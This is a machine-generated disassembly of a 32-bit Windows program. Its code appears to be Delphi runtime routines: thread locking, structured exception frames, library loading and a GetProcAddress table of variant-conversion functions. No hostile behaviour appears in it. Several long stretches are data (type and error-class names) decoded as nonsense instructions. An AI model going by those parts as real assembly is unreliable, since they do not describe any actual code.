retn
mov eax esi
call sub_4035c0
sub_40d260
push ebx
push esi
push edi
push ebp
push ecx
mov edi eax
mov bl 0x1
call GetCurrentThreadId
mov esi eax
cmp esi [ edi + 0x24 ]
je r-xdata
inc [ edi + 0x1c ]
mov eax ebx
pop edx
pop ebp
pop edi
pop esi
pop ebx
retn
mov eax edi
call sub_40d21c
mov ebp [ edi + 0x28 ]
mov edx esp
mov eax [ edi + 0x20 ]
call sub_40d098
mov eax [ esp ]
cmp [ eax + 0xc ] 0x0
seta bl
test bl bl
je r-xdata
lea eax [ edi + 0xc ]
mov edx 0xffff0001
call sub_40d028
cmp eax 0xffff
jne r-xdata
lea eax [ edi + 0xc ]
call sub_40d008
jmp r-xdata
lea eax [ edi + 0xc ]
mov edx 0xffff
call sub_40d028
test eax eax
je r-xdata
mov eax edi
call sub_40d21c
test bl bl
je r-xdata
mov eax edi
call sub_40d250
mov [ edi + 0x24 ] esi
lea eax [ edi + 0x28 ]
call sub_40d008
dec eax
cmp eax ebp
sete bl
lea eax [ edi + 0xc ]
call sub_40d014
sub_40d2fc
push ebx
push ecx
mov ebx eax
mov edx esp
mov eax [ ebx + 0x20 ]
call sub_40d098
dec [ ebx + 0x1c ]
cmp [ ebx + 0x1c ] 0x0
jne r-xdata
mov eax [ esp ]
cmp [ eax + 0xc ] 0x0
jne r-xdata
xor eax eax
mov [ ebx + 0x24 ] eax
lea eax [ ebx + 0xc ]
mov edx 0xffff
call sub_40d028
mov eax ebx
call sub_40d234
mov eax ebx
call sub_40d228
pop edx
pop ebx
retn
mov edx esp
mov eax [ ebx + 0x20 ]
call sub_40d110
sub_40d34c
push ebx
push esi
push ecx
mov esi eax
mov edx esp
mov eax [ esi + 0x20 ]
call sub_40d098
mov eax [ esp ]
inc [ eax + 0xc ]
mov eax [ esp ]
cmp [ eax + 0xc ] 0x1
seta bl
call GetCurrentThreadId
cmp eax [ esi + 0x24 ]
je r-xdata
pop edx
pop esi
pop ebx
retn
test bl bl
jne r-xdata
mov eax esi
call sub_40d240
jmp r-xdata
lea eax [ esi + 0xc ]
call sub_40d014
test eax eax
jle r-xdata
lea eax [ esi + 0xc ]
call sub_40d008
cmp eax 0xffff
jne r-xdata
push 0x0
call Sleep
mov eax esi
call sub_40d240
mov eax esi
call sub_40d234
sub_40d3b8
push ebx
push ecx
mov ebx eax
mov edx esp
mov eax [ ebx + 0x20 ]
call sub_40d098
mov eax [ esp ]
dec [ eax + 0xc ]
mov eax [ esp ]
cmp [ eax + 0xc ] 0x0
jne r-xdata
pop edx
pop ebx
retn
mov edx esp
mov eax [ ebx + 0x20 ]
call sub_40d110
call GetCurrentThreadId
cmp eax [ ebx + 0x24 ]
je r-xdata
lea eax [ ebx + 0xc ]
call sub_40d008
mov ecx eax
cmp ecx 0xffff
jne r-xdata
test ecx ecx
jg r-xdata
mov eax ebx
call sub_40d234
jmp r-xdata
mov eax ecx
mov ecx 0xffff
cdq
idiv ecx
test edx edx
jne r-xdata
mov eax ebx
call sub_40d234
sub_40d430
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
test ebx ebx
je r-xdata
xor eax eax
jmp r-xdata
push edi
push esi
push ebx
mov eax [ ebx ]
call [ eax ]
test eax eax
je r-xdata
pop edi
pop esi
pop ebx
retn
mov al 0x1
sub_40d454
push ebp
mov ebp esp
push 0x0
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
xor eax eax
push ebp
push sub_40d4cb
push [ fs : eax ]
mov [ fs : eax ] esp
test ebx ebx
je r-xdata
xor eax eax
jmp r-xdata
lea eax [ ebp - 0x4 ]
call sub_4059cc
mov ecx eax
mov edx r-xdata
mov eax ebx
call sub_403300
test al al
je r-xdata
mov ebx eax
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_40d4d2
lea eax [ ebp - 0x4 ]
call sub_4059cc
retn
mov ecx edi
mov edx esi
mov eax ebx
call sub_403300
test al al
jne r-xdata
mov ecx edi
mov edx esi
mov eax [ ebp - 0x4 ]
call sub_40d430
test al al
jne r-xdata
mov al 0x1
sub_40d4ec
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
mov ebx eax
push edx
call SetErrorMode
mov [ ebp - 0xc ] eax
xor eax eax
push ebp
push sub_40d55e
push [ fs : eax ]
mov [ fs : eax ] esp
fnstcw [ ebp - 0x2 ]
xor eax eax
push ebp
push sub_40d540
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax ebx
call sub_40445c
push eax
call LoadLibraryA
mov [ ebp - 0x8 ] eax
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_40d547
fnclex
fldcw [ ebp - 0x2 ]
retn
sub_40d731
xchg esp eax
inc edi
add [ eax ] al
add [ eax ] al
add ah dl
and [ edi ] eax
rcl [ ebx + 0x47 ] 0x0
add al dl
and [ edi ] eax
adc [ edx + 0x47 ] 0x0
add ah cl
and [ edi ] eax
nop
xchg ebx eax
inc edi
add [ eax ] al
add [ eax ] al
add al cl
and [ edi ] eax
adc al 0x94
inc edi
add [ eax ] al
add [ eax ] al
add ah al
and [ edi ] eax
test al 0x93
inc edi
add [ eax ] al
add [ eax ] al
add al al
and [ edi ] eax
les edx [ edx + 0x47 ]
add [ eax ] al
mov esp 0x3c004721
xchg ecx eax
inc edi
add [ eax ] al
add [ eax ] al
add [ eax + 0x40004721 ] bh
xchg ebx eax
inc edi
add [ eax ] al
add [ eax ] al
add [ ecx - 0x6a83ffb9 ] dh
inc edi
add [ eax ] al
add [ eax ] al
add [ eax + 0x24004721 ] dh
xchg ebp eax
inc edi
add [ eax ] al
add [ eax ] al
add [ ecx - 0x6c07ffb9 ] ch
inc edi
add [ eax ] al
add [ eax ] al
add [ eax + 0x34004721 ] ch
xchg edx eax
inc edi
add [ eax ] al
add [ eax ] al
add [ ecx - 0x6eafffb9 ] ah
inc edi
add [ eax ] al
add [ eax ] al
add [ eax + 0x10004721 ] ah
xchg ebp eax
inc edi
add [ eax ] al
add [ eax ] al
add [ ecx - 0x69ebffb9 ] bl
inc edi
add [ eax ] al
add [ eax ] al
add [ eax - 0x5bffb8df ] bl
xchg ecx eax
inc edi
add [ eax ] al
add [ eax ] al
add [ ecx - 0x6edbffb9 ] dl
inc edi
add [ eax ] al
add [ eax ] al
add [ eax + 0x54004721 ] dl
xchg ebp eax
inc edi
add [ eax ] al
add [ eax ] al
add [ ecx - 0x6c0bffb9 ] cl
inc edi
add [ eax ] al
add [ eax ] al
add [ eax - 0x4bffb8df ] cl
xchg ebp eax
inc edi
add [ eax ] al
add [ eax ] al
add [ ecx + 0x47 ] ah
add [ ebx + edx * 4 ] ah
inc edi
add [ eax ] al
add [ eax ] al
add [ eax + 0x21 ] ah
inc edi
add [ edx + edx * 4 + 0x47 ] al
add [ eax ] al
add [ eax ] al
add [ ebp - 0x75 ] dl
in al dx
xor eax eax
push ebp
push sub_40d9b5
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_40d9bc
retn
mov eax rw-data
call sub_40d420
call sub_40cf8c
call sub_40c0c0
mov eax rw-data
mov ecx 0x16
mov edx [ sub_40bb98 ]
call sub_404a50
mov eax rw-data
mov ecx 0x7
mov edx [ r-xdata ]
call sub_404a50
mov eax rw-data
mov ecx 0x2
mov edx [ r-xdata ]
call sub_404a50
mov eax rw-data
call sub_403f9c
mov eax rw-data
mov edx [ r-xdata ]
call sub_405320
mov eax rw-data
mov edx [ r-xdata ]
call sub_405320
mov eax rw-data
mov ecx 0x7
mov edx [ r-xdata ]
call sub_404a50
mov eax rw-data
mov ecx 0x7
mov edx [ r-xdata ]
call sub_404a50
mov eax rw-data
mov ecx 0x7
mov edx [ r-xdata ]
call sub_404a50
mov eax rw-data
mov ecx 0xc
mov edx [ r-xdata ]
call sub_404a50
mov eax rw-data
mov ecx 0xc
mov edx [ r-xdata ]
call sub_404a50
mov eax rw-data
call sub_403f9c
mov eax rw-data
call sub_403f9c
mov eax rw-data
call sub_403f9c
mov eax rw-data
call sub_403f9c
mov eax rw-data
call sub_403f9c
mov eax rw-data
call sub_403f9c
mov eax rw-data
call sub_403f9c
mov eax rw-data
call sub_403f9c
mov eax rw-data
call sub_4046a8
mov eax rw-data
call sub_403f9c
sub_40d9be
mov eax eax
push ebp
mov ebp esp
xor eax eax
push ebp
push sub_40da28
push [ fs : eax ]
mov [ fs : eax ] esp
sub [ rw-data ] 0x1
jae r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_40da2f
retn
mov eax r-xdata
call sub_403d48
mov eax r-xdata
call sub_403d70
cmp [ rw-data ] 0x0
je r-xdata
call sub_40c03c
call sub_40c140
call sub_40cfac
call sub_40ca10
mov eax rw-data
mov edx r-xdata
call sub_403ff0
sub_40da66
mov eax eax
push ebp
mov ebp esp
cmp [ ebp + 0x10 ] 0x400
je r-xdata
mov ax [ ebp + 0x18 ]
push eax
mov ax [ ebp + 0x14 ]
push eax
mov eax [ ebp + 0xc ]
push eax
mov eax [ ebp + 0x8 ]
push eax
call VariantChangeType
mov eax 0x80004001
jmp r-xdata
pop ebp
retn 0x14
sub_40dabc
push ebp
mov ebp esp
push 0x0
push ebx
xor eax eax
push ebp
push sub_40db16
push [ fs : eax ]
mov [ fs : eax ] esp
cmp [ ebp + 0xc ] 0x400
je r-xdata
lea eax [ ebp - 0x4 ]
mov edx [ ebp + 0x8 ]
call sub_404224
mov eax [ ebp - 0x4 ]
mov edx [ ebp + 0x14 ]
call sub_408444
and eax 0x7f
mov ebx [ eax * 4 + rw-data ]
mov ebx 0x80004001
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_40db1d
lea eax [ ebp - 0x4 ]
call sub_403f9c
retn
sub_40db28
push ebp
mov ebp esp
push 0x0
push ebx
xor eax eax
push ebp
push sub_40db82
push [ fs : eax ]
mov [ fs : eax ] esp
cmp [ ebp + 0xc ] 0x400
je r-xdata
lea eax [ ebp - 0x4 ]
mov edx [ ebp + 0x8 ]
call sub_404224
mov eax [ ebp - 0x4 ]
mov edx [ ebp + 0x14 ]
call sub_4097dc
and eax 0x7f
mov ebx [ eax * 4 + rw-data ]
mov ebx 0x80004001
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_40db89
lea eax [ ebp - 0x4 ]
call sub_403f9c
retn
sub_40db94
push ebp
mov ebp esp
push 0x0
push ebx
xor eax eax
push ebp
push sub_40dbee
push [ fs : eax ]
mov [ fs : eax ] esp
cmp [ ebp + 0xc ] 0x400
je r-xdata
lea eax [ ebp - 0x4 ]
mov edx [ ebp + 0x8 ]
call sub_404224
mov eax [ ebp - 0x4 ]
mov edx [ ebp + 0x14 ]
call sub_4097b0
and eax 0x7f
mov ebx [ eax * 4 + rw-data ]
mov ebx 0x80004001
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_40dbf5
lea eax [ ebp - 0x4 ]
call sub_403f9c
retn
sub_40dc00
push ebp
mov ebp esp
push 0x0
push ebx
xor eax eax
push ebp
push sub_40dc5a
push [ fs : eax ]
mov [ fs : eax ] esp
cmp [ ebp + 0xc ] 0x400
je r-xdata
lea eax [ ebp - 0x4 ]
mov edx [ ebp + 0x8 ]
call sub_404224
mov eax [ ebp - 0x4 ]
mov edx [ ebp + 0x14 ]
call sub_40b098
and eax 0x7f
mov ebx [ eax * 4 + rw-data ]
mov ebx 0x80004001
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_40dc61
lea eax [ ebp - 0x4 ]
call sub_403f9c
retn
sub_40dc6c
push ebp
mov ebp esp
push 0x0
push ebx
xor eax eax
push ebp
push sub_40dcc6
push [ fs : eax ]
mov [ fs : eax ] esp
cmp [ ebp + 0xc ] 0x400
je r-xdata
lea eax [ ebp - 0x4 ]
mov edx [ ebp + 0x8 ]
call sub_404224
mov eax [ ebp - 0x4 ]
mov edx [ ebp + 0x14 ]
call sub_409808
and eax 0x7f
mov ebx [ eax * 4 + rw-data ]
mov ebx 0x80004001
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_40dccd
lea eax [ ebp - 0x4 ]
call sub_403f9c
retn
sub_40dcd8
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
xor eax eax
mov [ ebp - 0x8 ] eax
xor eax eax
push ebp
push sub_40dd45
push [ fs : eax ]
mov [ fs : eax ] esp
cmp [ ebp + 0xc ] 0x400
je r-xdata
lea eax [ ebp - 0x8 ]
mov edx [ ebp + 0x8 ]
call sub_404224
mov eax [ ebp - 0x8 ]
lea edx [ ebp - 0x1 ]
call sub_408550
and eax 0x7f
mov ebx [ eax * 4 + rw-data ]
cmp [ ebp - 0x1 ] 0x1
cmc
sbb eax eax
mov edx [ ebp + 0x14 ]
mov [ edx ] ax
mov ebx 0x80004001
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_40dd4c
lea eax [ ebp - 0x8 ]
call sub_403f9c
retn
sub_40dd58
push ebp
mov ebp esp
push 0x0
push ebx
mov eax [ ebp + 0x18 ]
test eax eax
je r-xdata
xor eax eax
push ebp
push sub_40ddb8
push [ fs : eax ]
mov [ fs : eax ] esp
cmp [ ebp + 0x10 ] 0x400
je r-xdata
xor edx edx
mov [ eax ] edx
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
lea eax [ ebp - 0x4 ]
call sub_409728
mov edx [ ebp - 0x4 ]
mov eax [ ebp + 0x18 ]
call sub_4047f4
xor ebx ebx
mov ebx 0x80004001
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_40ddbf
lea eax [ ebp - 0x4 ]
call sub_403f9c
retn
sub_40ddc8
push ebp
mov ebp esp
push 0x0
push ebx
mov eax [ ebp + 0x18 ]
test eax eax
je r-xdata
xor eax eax
push ebp
push sub_40de28
push [ fs : eax ]
mov [ fs : eax ] esp
cmp [ ebp + 0x10 ] 0x400
je r-xdata
xor edx edx
mov [ eax ] edx
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
lea eax [ ebp - 0x4 ]
call sub_40a824
mov edx [ ebp - 0x4 ]
mov eax [ ebp + 0x18 ]
call sub_4047f4
xor ebx ebx
mov ebx 0x80004001
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_40de2f
lea eax [ ebp - 0x4 ]
call sub_403f9c
retn
sub_40de38
push ebp
mov ebp esp
push 0x0
push ebx
mov eax [ ebp + 0x14 ]
test eax eax
je r-xdata
xor eax eax
push ebp
push sub_40de9c
push [ fs : eax ]
mov [ fs : eax ] esp
cmp [ ebp + 0xc ] 0x400
je r-xdata
xor edx edx
mov [ eax ] edx
cmp [ ebp + 0x8 ] 0x1
sbb eax eax
inc eax
lea ecx [ ebp - 0x4 ]
xor edx edx
call sub_4085ec
mov edx [ ebp - 0x4 ]
mov eax [ ebp + 0x14 ]
call sub_4047f4
xor ebx ebx
mov ebx 0x80004001
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_40dea3
lea eax [ ebp - 0x4 ]
call sub_403f9c
retn
sub_40deec
push ebp
mov ebp esp
push ebx
mov ebx edx
mov edx ebx
mov ecx [ ebp + 0x8 ]
cmp [ ecx - 0x4 ] 0x0
je r-xdata
mov eax edx
pop ebx
pop ebp
retn
push eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
push eax
call GetProcAddress
mov edx eax
test edx edx
jne r-xdata
mov edx ebx
sub_40df18
push ebp
mov ebp esp
push ecx
push r-xdata
call GetModuleHandleA
mov [ ebp - 0x4 ] eax
push ebp
mov edx r-xdata
mov eax r-xdata
call sub_40deec
pop ecx
mov [ rw-data ] eax
push ebp
mov edx r-xdata
mov eax r-xdata
call sub_40deec
pop ecx
mov [ rw-data ] eax
push ebp
mov edx r-xdata
mov eax r-xdata
call sub_40deec
pop ecx
mov [ rw-data ] eax
push ebp
mov edx sub_40daa4
mov eax r-xdata
call sub_40deec
pop ecx
mov [ rw-data ] eax
push ebp
mov edx sub_40daa4
mov eax r-xdata
call sub_40deec
pop ecx
mov [ rw-data ] eax
push ebp
mov edx sub_40daa4
mov eax r-xdata
call sub_40deec
pop ecx
mov [ rw-data ] eax
push ebp
mov edx sub_40daa4
mov eax r-xdata
call sub_40deec
pop ecx
mov [ rw-data ] eax
push ebp
mov edx sub_40daa4
mov eax r-xdata
call sub_40deec
pop ecx
mov [ rw-data ] eax
push ebp
mov edx sub_40daa4
mov eax r-xdata
call sub_40deec
pop ecx
mov [ rw-data ] eax
push ebp
mov edx sub_40daa4
mov eax r-xdata
call sub_40deec
pop ecx
mov [ rw-data ] eax
push ebp
mov edx sub_40daa4
mov eax r-xdata
call sub_40deec
pop ecx
mov [ rw-data ] eax
push ebp
mov edx sub_40daa4
mov eax r-xdata
call sub_40deec
pop ecx
mov [ rw-data ] eax
push ebp
mov edx sub_40dab0
mov eax r-xdata
call sub_40deec
pop ecx
mov [ rw-data ] eax
push ebp
mov edx sub_40dabc
mov eax r-xdata
call sub_40deec
pop ecx
mov [ rw-data ] eax
push ebp
mov edx sub_40db28
mov eax r-xdata
call sub_40deec
pop ecx
mov [ rw-data ] eax
push ebp
mov edx sub_40db94
mov eax r-xdata
call sub_40deec
pop ecx
mov [ rw-data ] eax
push ebp
mov edx sub_40dc00
mov eax r-xdata
call sub_40deec
pop ecx
mov [ rw-data ] eax
push ebp
mov edx sub_40dc6c
mov eax r-xdata
call sub_40deec
pop ecx
mov [ rw-data ] eax
push ebp
mov edx sub_40dcd8
mov eax r-xdata
call sub_40deec
pop ecx
mov [ rw-data ] eax
push ebp
mov edx sub_40dd58
mov eax r-xdata
call sub_40deec
pop ecx
mov [ rw-data ] eax
push ebp
mov edx sub_40ddc8
mov eax r-xdata
call sub_40deec
pop ecx
mov [ rw-data ] eax
push ebp
mov edx sub_40de38
mov eax r-xdata
call sub_40deec
pop ecx
mov [ rw-data ] eax
pop ecx
pop ebp
retn
sub_40e224
push ebp
mov ebp esp
xor eax eax
push ebp
push sub_40e249
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_40e250
retn
sub_40e39e
inc [ eax ]
add [ eax ] al
add [ eax ] cl
push esi
popad
jb r-xdata
jecxz r-xdata
popad
outsb
je r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ edx - 0x38ffbf1d ] bh
jecxz r-xdata
add [ ecx ] al
add [ eax ] al
add [ edx + 0x5c ] dl
mov dh 0x1c

int3
jo r-xdata
imul esp [ ebp + 0x61 ] 0x62
insb
push esi
add [ eax ] al
add [ eax ] al
add ah dl
jecxz r-xdata
in al 0x31
jb r-xdata
outsd
popad
outsb
je r-xdata
add ah bl
in al 0x40
add [ eax ] dl
add [ eax ] al
add [ edx + 0x34940040 ] dh
inc eax
add [ eax - 0x5bffbfcc ] ah
xor al 0x40
add [ eax - 0x63ffbfcc ] ch
xor al 0x40
add ah ah
xor [ eax ] eax
add [ edx ] dh
inc eax
add al ch
push eax
inc ecx
add [ edx + edx * 2 ] bh
inc ecx
add [ eax + 0x51 ] bh
inc ecx
add [ ecx + edx * 2 + 0x518c0041 ] ch
inc ecx
add [ eax + 0x74004155 ] bl
push ecx
inc ecx
add [ ecx * 2 + 0x4d540041 ] bl
inc ecx
add al ah
dec ebp
inc ecx
add [ edx + ebp + 0x40 ] al
add [ edx + ebp + 0x40 ] al
add [ eax ] dl
dec ebp
inc ecx
add al al
push ecx
inc ecx
add [ eax - 0x63ffbeb3 ] ch
dec ebp
inc ecx
add [ edx + edx * 2 + 0x585c0041 ] al
inc ecx
add [ eax + 0x58 ] ch
inc ecx
add [ eax + ebx * 2 + 0x41 ] al
add [ eax + 0x58 ] dl
inc ecx
add [ esi ] dl
push esp
dec ecx
outsb
jbe r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ esi + 0x40 ] ch
inc ebp
jb r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] cl
out 0x40 al
add [ eax + eax ] cl
add [ eax ] al
mov eax 0x9400407a
xor al 0x40
add [ eax - 0x5bffbfcc ] ah
xor al 0x40
add [ eax - 0x63ffbfcc ] ch
xor al 0x40
add ah ah
xor [ eax ] eax
add [ edx ] dh
popad
jb r-xdata
push esi
inc eax
add [ 0x72615645 ] dl
imul esp [ ecx + 0x6e ] 0x70795474
movsb [ edi ] [ esi ]
in eax 0x40
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ebp + 0xc0040 ] ah
jb r-xdata
jns r-xdata
push esi
popad
jb r-xdata
popad
outsb
je r-xdata
add [ eax + eax ] cl
add [ eax ] al
mov eax 0x9400407a
xor al 0x40
add [ eax - 0x5bffbfcc ] ah
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
insb
out 0x40 al
outsd
jb r-xdata
inc ecx
jb r-xdata
insb
outsd
ja r-xdata
jo r-xdata
popad
outsb
je r-xdata
add [ eax ] al
mov eax 0x9400407a
xor al 0x40
add [ eax - 0x5bffbfcc ] ah
xor al 0x40
add [ eax - 0x63ffbfcc ] ch
xor al 0x40
add ah ah
xor [ eax ] eax
add [ edx ] dh
inc eax
add [ edx + esi ] bh
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
movsb [ edi ] [ esi ]
in eax 0x40
add [ eax + eax ] cl
nop
inc eax
in eax 0x40
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax - 0x1b ] al
inc eax
add [ eax + eax ] cl
add [ eax ] al
mov eax 0x9400407a
xor al 0x40
add [ eax - 0x5bffbfcc ] ah
xor al 0x40
add [ eax - 0x63ffbfcc ] ch
xor al 0x40
add ah ah
xor [ eax ] eax
add [ edx ] dh
inc eax
add [ edx + esi ] bh
inc eax
add [ esi ] dl
inc ebp
push esi
popad
adc eax 0x72615645
jns r-xdata
add [ esp + esi + 0x31e40040 ] bl
inc eax
add [ eax ] al
xor al [ eax ]
cmp al 0x32
outsb
jbe r-xdata
ror [ eax ] 0xe6
inc eax
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
outsd
jb r-xdata
inc ebp
jb r-xdata
add ah ah
xor [ eax ] eax
add [ edx ] dh
inc eax
add [ edx + esi ] bh
inc eax
add [ edi ] dl
inc ebp
push esi
popad
jb r-xdata
jb r-xdata
popad
jae r-xdata
inc ebx
inc eax
add [ eax ] al
xor al [ eax ]
cmp al 0x32
add [ esp + esi + 0x31e40040 ] bl
outsb
jbe r-xdata
add ah ah
xor [ eax ] eax
add [ edx ] dh
inc eax
add [ edx + esi ] bh
inc eax
add [ eax ] bl
inc ebp
push esi
popad
jb r-xdata
jb r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
inc ebp
jb r-xdata
outsb
js r-xdata
dec ecx
popad
outsb
je r-xdata
popad
insb
imul esp [ ecx + eax * 2 + 0x72 ] 0x72724567
imul esp [ ecx + 0x6e ] 0x64614274
dec ecx
xor al 0x40
add [ eax - 0x63ffbfcc ] ch
xor al 0x40
add ah ah
xor [ eax ] eax
add [ edx ] dh
inc eax
add [ edx + esi ] bh
inc eax
add [ 0x72615645 ] dl
out 0x40 eax
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ edi ] dh
inc eax
add [ eax + eax ] cl
add [ eax ] al
mov eax 0x9400407a
xor al 0x40
add [ eax - 0x5bffbfcc ] ah
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
xor al 0xe7
outsd
jb r-xdata
inc eax
add [ edi ] dl
inc ebp
push esi
popad
jb r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
shl dh 0x1
inc eax
outsd
jb r-xdata
jns r-xdata
jb r-xdata
insb
imul esp [ edi + ecx * 2 + 0x70 ] 0x6f727245
outsb
je r-xdata
popad
outsb
je r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add al ch
inc eax
add [ eax + eax ] cl
add [ eax ] al
mov eax 0x9400407a
xor al 0x40
outsd
jb r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
cwde
out 0x40 eax
add [ eax + eax ] cl
add [ eax ] al
mov eax 0x9400407a
xor al 0x40
add [ eax - 0x5bffbfcc ] ah
xor al 0x40
add [ eax - 0x63ffbfcc ] ch
xor al 0x40
movsb [ edi ] [ esi ]
xor al 0x40
add [ eax - 0x63ffbfcc ] ch
xor al 0x40
add [ eax + eax ] cl
add [ eax ] al
mov eax 0x9400407a
xor al 0x40
add [ eax - 0x5bffbfcc ] ah
xor al 0x40
add [ eax - 0x63ffbfcc ] ch
xor al 0x40
add ah ah
xor [ eax ] eax
add [ edx ] dh
inc eax
add [ edx + esi ] bh
out 0x40 al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add al dl
out 0x40 al
popad
outsb
je r-xdata
shr [ esi + 0x40 ] 0x0
add [ eax ] al
add [ eax ] al
add [ eax ] al
insb
out 0x40 al
add [ eax ] al
add [ eax ] al
add [ eax ] al
inc ebx
add [ eax - 0x5bffbfcc ] ah
xor al 0x40
jb r-xdata
add [ eax - 0x5bffbfcc ] ah
xor al 0x40
add [ eax - 0x63ffbfcc ] ch
xor al 0x40
jb r-xdata
rcr [ eax + 0x40e7 ] 0x0
inc eax
add [ edx + esi ] bh
inc eax
add [ 0x72615645 ] dl
imul esp [ ecx + 0x6e ] 0x65764f74
jb r-xdata
in al 0x31
inc eax
add [ eax ] al
xor al [ eax ]
cmp al 0x32
inc eax
add [ eax ] bl
inc ebp
push esi
popad
jb r-xdata
outsd
inc eax
add ah cl
call sub_40e8c6
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
int3
popad
jb r-xdata
popad
jns r-xdata
outsb
je r-xdata
popad
outsb
je r-xdata
inc eax
insd
add [ eax - 0x63ffbfcc ] ch
xor al 0x40
add ah ah
xor [ eax ] eax
add [ edx ] dh
inc eax
add [ edx + esi ] bh
inc eax
add [ eax * 2 + 0x69726156 ] dl
inc eax
jb r-xdata
add ah ah
xor [ eax ] eax
add [ edx ] dh
add [ eax ] al
jb r-xdata
add ah ah
xor [ eax ] eax
add [ edx ] dh
outsd
arpl [ ebx + 0x65 ] bp
inc ebp
jb r-xdata
add [ edx + esi ] bh
inc eax
add [ 0x72615645 ] dl
imul esp [ ecx + 0x6e ] 0x73694474
jo r-xdata
outsb
js r-xdata
xor al 0x40
add ah ah
xor [ eax ] eax
add [ edx ] dh
inc eax
add [ edx + esi ] bh
inc eax
add [ edi ] dl
inc ebp
push esi
popad
jb r-xdata
jne r-xdata
jb r-xdata
inc ebp
jo r-xdata
popad
je r-xdata
inc eax
add [ eax - 0x18 ] ch
inc eax
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax - 0x18 ] ch
inc eax
add [ eax + eax ] cl
add [ eax ] al
mov eax 0x9400407a
xor al 0x40
outsd
jb r-xdata
add esp 0xffffffe4
push ebx
je r-xdata
in al dx
arpl [ gs : ebp + 0x64 ] si
inc ebp
jb r-xdata
jae r-xdata
popad
cwde
dec edi
dec bp
insd
outsd
jb r-xdata
je r-xdata
inc eax
